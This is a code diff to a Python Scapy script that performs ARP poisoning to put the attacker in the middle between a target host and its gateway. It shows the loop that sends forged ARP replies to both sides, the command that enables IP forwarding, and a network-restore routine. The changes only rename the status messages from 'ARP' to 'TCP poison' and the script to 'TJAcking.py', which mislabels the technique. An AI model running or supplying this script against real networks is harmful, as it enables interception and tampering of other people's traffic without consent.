@@ -58,18 +58,18 @@ def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
 #Keep sending false ARP replies to put our man in the middle to intercept packets
 #This will use our interface MAC address as the hwsrc for the ARP reply
 def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
-    print("[*] Started ARP poison attack [CTRL-C to stop]")
+    print("[*] Started TCP poison attack [CTRL-C to stop]")
     try:
         while True:
             send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
             send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
             time.sleep(2)
     except KeyboardInterrupt:
-        print("[*] Stopped ARP poison attack. Restoring network")
+        print("[*] Stopped TCP poison attack. Restoring network")
         restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
 
 #Start the program
-print("[*] Starting script: ARPS.py")
+print("[*] Starting script: TJAcking.py")
 print("[*] Enabling IP forwarding")
 #Enable IP Forward on a MAC
 os.system("sysctl -w net.inet.ip.forwarding=1")
